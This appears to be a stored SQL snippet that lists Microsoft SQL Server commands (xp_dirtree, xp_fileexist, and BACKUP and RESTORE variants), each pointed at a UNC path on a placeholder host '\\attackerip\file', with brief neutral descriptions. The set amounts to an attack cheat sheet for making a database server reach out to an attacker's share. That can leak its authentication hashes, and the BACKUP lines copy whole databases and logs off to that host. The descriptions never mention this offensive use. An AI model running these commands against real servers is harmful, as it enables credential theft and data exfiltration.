---
id: 0eeddc00-ffbd-476c-89fa-797e79df9fb6
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:34.040390+00:00'
updated_at: '2023-04-10T20:22:39.036704+00:00'
---

# Code Snippet 0eeddc00

**Language**: SQL

```sql
xp_dirtree '\\attackerip\file'

This command returns a directory tree of a specified path from a remote server.

xp_fileexist '\\attackerip\file'

This command checks if the specified file exists on the remote server and returns a value of either 1 (if the file exists) or 0 (if the file does not exist).

BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'

This command creates a backup of the transaction log of the specified database and saves it to the specified file path on the remote server.

BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'

This command creates a backup of the specified database and saves it to the specified file path on the remote server.

RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'

This command restores a transaction log backup of the specified database from the specified file path on the remote server.

RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'

This command restores a database backup of the specified database from the specified file path on the remote server.

RESTORE HEADERONLY FROM DISK = '\\attackerip\file'

This command returns the header information of the backup file from the specified file path on the remote server.

RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'

This command returns a list of files included in the backup file from the specified file path on the remote server.

RESTORE LABELONLY FROM DISK = '\\attackerip\file'

This command returns the backup label information from the specified file path on the remote server.

RESTORE REWINDONLY FROM DISK = '\\attackerip\file'

This command rewinds the tape to the beginning of the backup file from the specified file path on the remote server.

RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'

This command verifies the backup file from the specified file path on the remote server.
```
